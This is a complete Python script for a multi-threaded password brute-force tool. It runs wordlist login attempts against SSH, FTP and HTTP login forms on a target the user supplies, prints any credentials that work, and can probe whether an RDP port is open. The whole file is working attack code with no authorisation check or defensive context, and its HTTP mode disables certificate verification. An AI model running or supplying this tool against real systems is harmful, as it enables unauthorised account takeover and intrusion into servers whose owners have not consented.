import threading
from queue import Queue
import sys
import time
import os



def show_banner():
    print(r"""
 ______   _______          _________ _______  _______  _______  _______  _______ 
(  ___ \ (  ____ )|\     /|\__   __/(  ____ \(  ____ )(  ___  )(  ____ \(  ____ \
| (   ) )| (    )|| )   ( |   ) (   | (    \/| (    )|| (   ) || (    \/| (    \/
| (__/ / | (____)|| |   | |   | |   | (__    | (____)|| (___) || (_____ | (_____ 
|  __ (  |     __)| |   | |   | |   |  __)   |  _____)|  ___  |(_____  )(_____  )
| (  \ \ | (\ (   | |   | |   | |   | (      | (      | (   ) |      ) |      ) |
| )___) )| ) \ \__| (___) |   | |   | (____/\| )      | )   ( |/\____) |/\____) |
|/ \___/ |/   \__/(_______)   )_(   (_______/|/       |/     \|\_______)\_______)

        爪ㄩㄥㄒ丨-卩尺ㄖㄒㄖ匚ㄖㄥ 乃尺ㄩㄒ乇-千ㄖ尺匚乇 ㄒㄖㄖㄥ
""")


def read_file(prompt):
    while True:
        path = input(prompt).strip()
        if not path:
            print("[!] Path cannot be empty.")
            continue
        if not os.path.isfile(path):
            print(f"[!] File not found: {path}")
            continue
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                lines = [line.strip() for line in f if line.strip()]
            if not lines:
                print("[!] File is empty.")
                continue
            return lines
        except Exception as e:
            print(f"[!] Error reading file: {e}")


def ssh_bruteforce(host, port, user, password, found_flag, lock_obj):
    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username=user, password=password, timeout=5)
        with lock_obj:
            if not found_flag[0]:
                print(f"\n[✓] SSH SUCCESS → {user}:{password}")
                found_flag[0] = True
        client.close()
        return True
    except Exception:
        return False

def ssh_worker(host, port, user_queue, pass_list, found_flag, lock_obj):
    while not user_queue.empty() and not found_flag[0]:
        user = user_queue.get()
        for password in pass_list:
            if found_flag[0]:
                break
            print(f"[SSH] {user}:{password}", end="\r", flush=True)
            ssh_bruteforce(host, port, user, password, found_flag, lock_obj)
        user_queue.task_done()


def ftp_bruteforce(host, port, user, password, found_flag, lock_obj):
    try:
        from ftplib import FTP
        ftp = FTP()
        ftp.connect(host, port, timeout=5)
        ftp.login(user, password)
        with lock_obj:
            if not found_flag[0]:
                print(f"\n[✓] FTP SUCCESS → {user}:{password}")
                found_flag[0] = True
        ftp.quit()
        return True
    except Exception:
        return False

def ftp_worker(host, port, user_queue, pass_list, found_flag, lock_obj):
    while not user_queue.empty() and not found_flag[0]:
        user = user_queue.get()
        for password in pass_list:
            if found_flag[0]:
                break
            print(f"[FTP] {user}:{password}", end="\r", flush=True)
            ftp_bruteforce(host, port, user, password, found_flag, lock_obj)
        user_queue.task_done()


def http_bruteforce(url, user_field, pass_field, user, password, fail_string, found_flag, lock_obj):
    try:
        import requests
        data = {user_field: user, pass_field: password}
        resp = requests.post(url, data=data, timeout=6, verify=False)
        if fail_string not in resp.text.lower():
            with lock_obj:
                if not found_flag[0]:
                    print(f"\n[✓] HTTP SUCCESS → {user}:{password}")
                    found_flag[0] = True
            return True
    except Exception:
        pass
    return False

def http_worker(url, user_field, pass_field, fail_string, user_queue, pass_list, found_flag, lock_obj):
    while not user_queue.empty() and not found_flag[0]:
        user = user_queue.get()
        for password in pass_list:
            if found_flag[0]:
                break
            print(f"[HTTP] {user}:{password}", end="\r", flush=True)
            http_bruteforce(url, user_field, pass_field, user, password, fail_string, found_flag, lock_obj)
        user_queue.task_done()


def rdp_check(host, port):
    try:
        import socket
        sock = socket.socket()
        sock.settimeout(3)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except Exception:
        return False


def run():
    found_flag = [False]
    lock_obj = threading.Lock()

    show_banner()

    print("\n[1] SSH")
    print("[2] FTP")
    print("[3] HTTP Form")
    print("[4] RDP (Check only)")

    while True:
        choice = input("\nSelect mode (1-4): ").strip()
        if choice in ("1", "2", "3", "4"):
            break
        print("[!] Invalid choice")

    mode_map = {"1": "ssh", "2": "ftp", "3": "http", "4": "rdp"}
    mode = mode_map[choice]

    target = input("\nEnter target (IP or URL): ").strip()
    if not target:
        print("[!] Target required")
        input("\nPress Enter to return to main menu...")
        return

    users = read_file("→ User list path: ")
    passwords = read_file("→ Password list path: ")

    threads_count = 10

    if mode == "ssh":
        port = int(input("Port (default 22): ").strip() or "22")
        print(f"\n[+] SSH brute-force {target}:{port}")
        q = Queue()
        for u in users:
            q.put(u)
        for _ in range(threads_count):
            threading.Thread(
                target=ssh_worker,
                args=(target, port, q, passwords, found_flag, lock_obj),
                daemon=True
            ).start()
        q.join()

    elif mode == "ftp":
        port = int(input("Port (default 21): ").strip() or "21")
        print(f"\n[+] FTP brute-force {target}:{port}")
        q = Queue()
        for u in users:
            q.put(u)
        for _ in range(threads_count):
            threading.Thread(
                target=ftp_worker,
                args=(target, port, q, passwords, found_flag, lock_obj),
                daemon=True
            ).start()
        q.join()

    elif mode == "http":
        user_field = input("Username field (default username): ").strip() or "username"
        pass_field = input("Password field (default password): ").strip() or "password"
        fail_string = input("Failure string (default invalid): ").strip().lower() or "invalid"

        print(f"\n[+] HTTP brute-force {target}")
        q = Queue()
        for u in users:
            q.put(u)
        for _ in range(threads_count):
            threading.Thread(
                target=http_worker,
                args=(target, user_field, pass_field, fail_string, q, passwords, found_flag, lock_obj),
                daemon=True
            ).start()
        q.join()

    elif mode == "rdp":
        port = int(input("Port (default 3389): ").strip() or "3389")
        print(f"\n[+] Checking RDP {target}:{port}")
        if rdp_check(target, port):
            print("[✓] RDP port is OPEN")
        else:
            print("[!] RDP port is CLOSED")

    print("\n[✓] Brute-force module finished")
    input("\nPress Enter to return to main menu...")
    return


if __name__ == "__main__":
    run()
